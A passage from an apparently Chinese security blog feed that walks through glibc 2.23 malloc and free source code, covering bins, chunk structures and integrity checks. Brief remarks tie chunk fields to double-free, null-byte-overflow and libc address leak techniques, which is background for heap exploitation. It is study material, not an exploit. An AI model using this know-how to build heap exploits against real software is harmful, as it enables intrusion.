href="#进入-Unsorted-bin" class="headerlink" title="进入 Unsorted bin"></a>进入 Unsorted bin</h2><p>如果被 free 的这个块不是 通过 mmap 获得的，就会进入下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 得到下一个 chunk 的指针</span></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能 free top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (top)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// nextchunk 不能越界，就是限制了 p-&gt;size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">              &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">              &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (out)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/*p 要被标识为 inuse 状态 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (!prev)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// nextsize 在  [ 2 * SIZE_SZ, av-&gt;system_mem] 之间</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">// 获得 nextchunk 的下一个 chunk, 的 pre_inused位</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 nextchunk 也是 free 状态的，合并</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// 合并的结果放置到 unsorted bin</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 防止 unsortedbin 被破坏</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">      systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>大概流程</p><ul><li>首先做了一些检查， p != top_chunk, p-&gt;size 不能越界， 限制了 next_chunk-&gt;size, p要处于 inuse状态（通过 next_chunk-&gt;pre_inused 判断）</li><li>接着判断 p 的前后相邻块是不是 free 状态，如果是就合并</li><li>根据此次拿到的 unsorted bin 的 大小，如果 size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</li></ul><p>如果 p 是通过 mmap 获得的，就通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munmap_chunk (p);</span><br></pre></td></tr></table></figure></p><p>释放掉他</p><h2 id="Check-In-Glbc"><a href="#Check-In-Glbc" class="headerlink" title="Check In Glbc"></a>Check In Glbc</h2><p><img alt="" data-src="/imgs/check_free.png" class="lozad"></p><p>来源 <a href="https://github.com/DhavalKapil/heap-exploitation" target="_blank" rel="noopener">https://github.com/DhavalKapil/heap-exploitation</a></p><p><a href="https://heap-exploitation.dhavalkapil.com/author.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/author.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GI-libc-free&quot;&gt;&lt;a href=&quot;#GI-libc-free&quot; class=&quot;headerlink&quot; title=&quot;_GI___libc_free&quot;&gt;&lt;/a&gt;_GI___libc_free&lt;/h2&gt;&lt;p&gt;首先是 _GI___libc_free&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/malloc%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/malloc源码简单分析/</id>
    <published>2020-02-26T10:29:09.000Z</published>
    <updated>2020-04-08T12:37:14.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文中未做说明 均是指 glibc 2.23</p><h2 id="简单源码分析"><a href="#简单源码分析" class="headerlink" title="简单源码分析"></a>简单源码分析</h2><p>本节只是简单跟读了一下 malloc 的源码， 说的比较简单，很多细节还是要自己拿一份源代码来读</p><h2 id="堆中的一些数据结构"><a href="#堆中的一些数据结构" class="headerlink" title="堆中的一些数据结构"></a>堆中的一些数据结构</h2><h3 id="堆管理结构"><a href="#堆管理结构" class="headerlink" title="堆管理结构"></a>堆管理结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line"> <span class="keyword">mutex_t</span> mutex;                 <span class="comment">/* Serialize access. */</span></span><br><span class="line"> <span class="keyword">int</span> flags;                       <span class="comment">/* Flags (formerly in max_fast). */</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">if</span> THREAD_STATS</span></span><br><span class="line"> <span class="comment">/* Statistics for locking. Only used if THREAD_STATS is defined. */</span></span><br><span class="line"> <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> mfastbinptr fastbins[NFASTBINS];    <span class="comment">/* Fastbins */</span></span><br><span class="line"> mchunkptr top;</span><br><span class="line"> mchunkptr last_remainder;</span><br><span class="line"> mchunkptr bins[NBINS * <span class="number">2</span>];</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];   <span class="comment">/* Bitmap of bins */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>           <span class="comment">/* Linked list */</span></span><br><span class="line"> INTERNAL_SIZE_T system_mem;</span><br><span class="line"> INTERNAL_SIZE_T max_system_mem;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><ul><li>malloc_state结构是我们最常用的结构，其中的重要字段如下：</li><li>fastbins：存储多个链表。每个链表由空闲的fastbin组成，是fastbin freelist。</li><li>top ：top chunk，指向的是arena中剩下的空间。如果各种freelist都为空，则从top chunk开始分配堆块。</li><li>bins：存储多个双向链表。意义上和堆块头部的双向链表一样，并和其组成了一个双向环状空闲列表（freelist）。这里的bins位于freelist的结构上的头部，后向指针（bk）指向freelist逻辑上的第一个节点。分配chunk时从逻辑上的第一个节点分配寻找合适大小的堆块。</li></ul><h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>prev_size：相邻的前一个堆块大小。这个字段只有在前一个堆块（且该堆块为normal chunk）处于释放状态时才有意义。这个字段最重要（甚至是唯一）的作用就是用于堆块释放时快速和相邻的前一个空闲堆块融合。该字段不计入当前堆块的大小计算。在前一个堆块不处于空闲状态时，数据为前一个堆块中用户写入的数据。libc这么做的原因主要是可以节约4个字节的内存空间，但为了这点空间效率导致了很多安全问题。</li><li>size：本堆块的长度。长度计算方式：size字段长度+用户申请的长度+对齐。libc以 size_T 长度<em>2 为粒度对齐。例如 32bit 以 4</em>2=8byte 对齐，64bit 以 8*2=0×10 对齐。因为最少以8字节对齐，所以size一定是8的倍数，故size字段的最后三位恒为0，libc用这三个bit做标志flag。比较关键的是最后一个bit（pre_inuse），用于指示相邻的前一个堆块是alloc还是free。如果正在使用，则 bit=1。libc判断 当前堆块是否处于free状态的方法 就是 判断下一个堆块的 pre_inuse 是否为 1 。这里也是 double free 和 null byte offset 等漏洞利用的关键。</li><li>fd &amp;bk：双向指针，用于组成一个双向空闲链表。故这两个字段只有在堆块free后才有意义。堆块在alloc状态时，这两个字段内容是用户填充的数据。两个字段可以造成内存泄漏（libc的bss地址），Dw shoot等效果。</li><li>值得一提的是，堆块根据大小，libc使用fastbin、chunk等逻辑上的结构代表，但其存储结构上都是malloc_chunk结构，只是各个字段略有区别，如fastbin相对于chunk，不使用bk这个指针，因为fastbin freelist是个单向链表。</li></ul><p>来源 <a href="https://www.freebuf.com/articles/system/91527.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/91527.html</a></p><h2 id="maclloc-源码分析"><a href="#maclloc-源码分析" class="headerlink" title="maclloc 源码分析"></a>maclloc 源码分析</h2><p>用户调用 malloc 时会先进入 __libc_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">// 如果设置了 __malloc_hook 就执行然后返回</span></span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果设置了 __malloc_hook 就执行它然后返回， 否则进入 _int_malloc 这个函数就是 malloc 的具体实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     计算出实际需要的大小，大小按照 2 * size_t 对齐， 64位： 0x10</span></span><br><span class="line"><span class="comment">     所以如个 malloc(0x28) ----&gt; nb = 0x30, 0x10 header + 0x20 当前块 + 0x8 下一块的 pre_size</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">    如果是第一次触发 malloc, 就会调用 sysmalloc---&gt; mmap 分配内存返回</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先把传入的 bytes 转换为 chunk 的实际大小，保存到 nb 里面。然后如果是第一次调用 malloc , 就会进入 sysmalloc 分配内存。</p><h3 id="搜索Fastbin"><a href="#搜索Fastbin" class="headerlink" title="搜索Fastbin"></a>搜索Fastbin</h3><p>接着会看申请的 nb 是不是在 fastbin 里面，如果是进入 fastbin 的处理流程<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);  <span class="comment">// 找到nb 对应的 fastbin 的 索引 idx</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">// 找到对应的 fastbin 的指针</span></span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>) <span class="comment">//如果 fastbin 非空，就进入这里</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">// 判断大小是否满足 fastbin相应bin的大小要求</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先根据 nb 找到该大小对应的 fastbin 的项， 然后看看该 fastbin 是不是为空，如果非空，就分配该 fastbin 的第一个 chunk 给用户。<br>分配过程还会检查待分配的 chunk 的 size 是不是满足在该 fastbin 项的限制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index (chunksize (victim)) != idx</span><br></pre></td></tr></table></figure></p><h3 id="搜索Smallbin"><a href="#搜索Smallbin" class="headerlink" title="搜索Smallbin"></a>搜索Smallbin</h3><p>如果 fastbin 为空或者 nb 不在 fastbin 里面，就会进入 smallbin 和 largebin 的处理逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//  找到 smallbin 索引</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">// 判断 bin 中是不是有 chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 链表检查</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置下一个chunk的 in_use 位</span></span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     大内存分配，进入 malloc_consolidate</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果申请的 nb 位于 smallbin 的范围，就会 fastbin 一样去找对应的项，然后判断 bin 是不是为空，如果不空, 分配第一个 chunk 给用户，分配之前还会校验该 chunk 是不是正确的。如果为空，就会进入 unsorted bin 的处理了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely (bck-&gt;fd != victim)</span><br></pre></td></tr></table></figure><p>如果 nb 不满足 smallbin ，就会触发 malloc_consolidate . 然后进入 unsorted bin</p><h3 id="搜索Unsorted-bin"><a href="#搜索Unsorted-bin" class="headerlink" title="搜索Unsorted bin"></a>搜索Unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 